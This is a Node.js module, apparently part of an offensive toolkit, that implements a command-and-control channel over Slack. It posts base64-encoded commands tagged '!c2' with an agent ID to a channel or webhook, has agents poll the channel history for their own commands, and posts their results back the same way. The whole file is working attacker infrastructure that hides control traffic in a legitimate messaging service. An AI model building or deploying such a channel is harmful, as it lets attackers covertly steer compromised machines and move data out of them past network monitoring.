const https = require('https');

class Slack {
  constructor(config) {
    this.webhookUrl = config.webhookUrl;
    this.token = config.token;
    this.channelId = config.channelId;
    this.commandPrefix = '!c2';
    this._lastPollTs = '0';
  }

  _parseWebhookUrl(url) {
    const match = url.match(/hooks\.slack\.com\/(services\/.+)/);
    if (!match) throw new Error('Invalid Slack webhook URL');
    return '/services/' + match[1];
  }

  _request(opts, body) {
    return new Promise((resolve, reject) => {
      const req = https.request(opts, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          try {
            const parsed = JSON.parse(data);
            if (res.statusCode >= 200 && res.statusCode < 300) {
              resolve(parsed);
            } else {
              reject(new Error(`Slack API error ${res.statusCode}: ${JSON.stringify(parsed)}`));
            }
          } catch (e) {
            if (res.statusCode >= 200 && res.statusCode < 300) {
              resolve(data);
            } else {
              reject(new Error(`Slack API error ${res.statusCode}: ${data}`));
            }
          }
        });
      });
      req.on('error', reject);
      if (body) req.write(typeof body === 'string' ? body : JSON.stringify(body));
      req.end();
    });
  }

  async sendCommand(agentId, b64Payload) {
    if (this.webhookUrl) {
      const urlObj = new URL(this.webhookUrl);
      const path = urlObj.pathname;

      const message = `${this.commandPrefix} ${agentId}: ${b64Payload}`;
      const body = JSON.stringify({ text: message });

      await this._request({
        hostname: urlObj.hostname,
        path,
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      }, body);

      return { channel: 'webhook', ts: Date.now() };
    }

    if (this.token && this.channelId) {
      const message = `${this.commandPrefix} ${agentId}: ${b64Payload}`;
      const result = await this._request({
        hostname: 'slack.com',
        path: '/api/chat.postMessage',
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${this.token}`,
          'Content-Type': 'application/json'
        }
      }, { channel: this.channelId, text: message });

      return { channel: this.channelId, ts: result.ts };
    }

    throw new Error('Slack: no webhook URL or token/channel configured');
  }

  async pollCommands(agentId) {
    if (!this.token || !this.channelId) {
      throw new Error('Slack: token and channelId required for polling');
    }

    const result = await this._request({
      hostname: 'slack.com',
      path: `/api/conversations.history?channel=${this.channelId}&limit=50&oldest=${this._lastPollTs}`,
      method: 'GET',
      headers: {
        'Authorization': `Bearer ${this.token}`
      }
    });

    if (!result.ok || !result.messages) {
      throw new Error(`Slack API error: ${result.error}`);
    }

    const commands = [];
    const prefix = `${this.commandPrefix} ${agentId}:`;

    for (const msg of result.messages) {
      if (msg.text && msg.text.startsWith(prefix)) {
        const b64Payload = msg.text.substring(prefix.length).trim();

        commands.push({
          id: msg.ts,
          agentId,
          command: b64Payload,
          timestamp: new Date(parseFloat(msg.ts) * 1000).toISOString()
        });
      }
    }

    if (result.messages.length > 0) {
      const latest = parseFloat(result.messages[0].ts);
      this._lastPollTs = (latest + 0.0001).toString();
    }

    return commands;
  }

  async sendResult(agentId, b64Payload) {
    if (this.webhookUrl) {
      const urlObj = new URL(this.webhookUrl);
      const message = `${this.commandPrefix} result ${agentId}: ${b64Payload}`;
      await this._request({
        hostname: urlObj.hostname,
        path: urlObj.pathname,
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      }, JSON.stringify({ text: message }));
      return { channel: 'webhook', ts: Date.now() };
    }

    if (this.token && this.channelId) {
      const message = `${this.commandPrefix} result ${agentId}: ${b64Payload}`;
      const result = await this._request({
        hostname: 'slack.com',
        path: '/api/chat.postMessage',
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${this.token}`,
          'Content-Type': 'application/json'
        }
      }, { channel: this.channelId, text: message });
      return { channel: this.channelId, ts: result.ts };
    }

    throw new Error('Slack: no webhook URL or token/channel configured');
  }

  async test() {
    try {
      if (this.token) {
        const result = await this._request({
          hostname: 'slack.com',
          path: '/api/auth.test',
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${this.token}`,
            'Content-Type': 'application/json'
          }
        });
        return result.ok === true;
      }
      if (this.webhookUrl) {
        const urlObj = new URL(this.webhookUrl);
        await this._request({
          hostname: urlObj.hostname,
          path: urlObj.pathname,
          method: 'POST',
          headers: { 'Content-Type': 'application/json' }
        }, JSON.stringify({ text: 'tsc-lotl test' }));
        return true;
      }
      return false;
    } catch {
      return false;
    }
  }
}

module.exports = Slack;
